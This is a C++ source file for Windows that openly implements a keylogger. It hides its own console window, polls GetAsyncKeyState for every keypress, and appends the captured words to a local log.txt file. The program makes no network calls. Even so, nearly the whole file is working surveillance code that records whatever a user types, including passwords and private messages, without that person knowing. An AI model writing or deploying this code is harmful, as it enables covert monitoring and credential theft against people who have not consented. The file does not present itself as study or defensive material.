#include <bits/stdc++.h>
#include <windows.h>
#include <fstream>

#define KEY_PRESSED -32767

using namespace std;

void write(string txt);

void on_load();

bool main_loop(string &word, int &count);

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE );
	
    on_load();

    string word = "";
    int count = 0;

    while (true)
    {
        bool running = main_loop(word, count);
        if (!running)
            break;
    }
    return 0;
}

bool main_loop(string &word, int &count)
{
	for (int i = 8; i < 169; i++)
    {
        if (GetAsyncKeyState(i) == KEY_PRESSED)
        {
			cout << "key code: " << i << endl;
            char ch = i;
            cout << "char: " << ch << endl;
            if (i == 32 || i == 13 || i == 10 || i == 27)
            {
                write(word + '\n');
                word = "";
                count++;
                if (i == 27)
                    return false;
            }
            else if (i == 8)
                word = word.substr(0, word.length() - 1);
            else
                word += ch;
            cout << "word: " << word << endl;
        }
    }
    return true;
}

void on_load()
{
    vector<string> ad = {
        " _   ,           _                                                                 ",
        "' ) /           //                                              /                  ",
        " /-<  _  __  , // __ _,  _,  _  __    ______  o __  __.  ____  /_  __.   _. _   _  ",
        "/   )</_/ (_/_</_(_)(_)_(_)_</_/ (_  / / / <_<_/ (_(_/|_/ / <_/ /_(_/|_o(__/_)_/_)_",
        "           /         /|  /|                                               /   /    ",
        "          '         |/  |/                                               '   '     "};

    for (string s : ad)
        cout << s << endl;
}

void write(string txt)
{
    ofstream file;
    file.open("log.txt", ios::app);
    file << txt;
    file.close();
}